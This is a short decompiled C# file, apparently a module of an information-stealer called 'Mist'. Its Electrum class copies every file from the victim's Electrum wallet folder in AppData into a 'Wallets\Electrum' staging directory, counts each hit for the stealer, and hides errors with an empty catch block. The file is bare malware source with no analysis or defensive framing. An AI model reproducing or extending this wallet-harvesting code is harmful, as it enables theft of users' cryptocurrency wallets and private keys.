using System;
using System.IO;

namespace Mist
{
	// Token: 0x02000069 RID: 105
	internal class Electrum
	{
		// Token: 0x0600028E RID: 654 RVA: 0x00012658 File Offset: 0x00010858
		public static void EleStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(Electrum.ElectrumDir2))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Electrum.ElectrumDir2).GetFiles())
					{
						Directory.CreateDirectory(directorypath + Electrum.ElectrumDir);
						fileInfo.CopyTo(directorypath + Electrum.ElectrumDir + fileInfo.Name);
					}
					Electrum.count++;
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400015E RID: 350
		public static int count = 0;

		// Token: 0x0400015F RID: 351
		public static string ElectrumDir = "\\Wallets\\Electrum\\";

		// Token: 0x04000160 RID: 352
		public static string ElectrumDir2 = Help.AppDate + "\\Electrum\\wallets";
	}
}
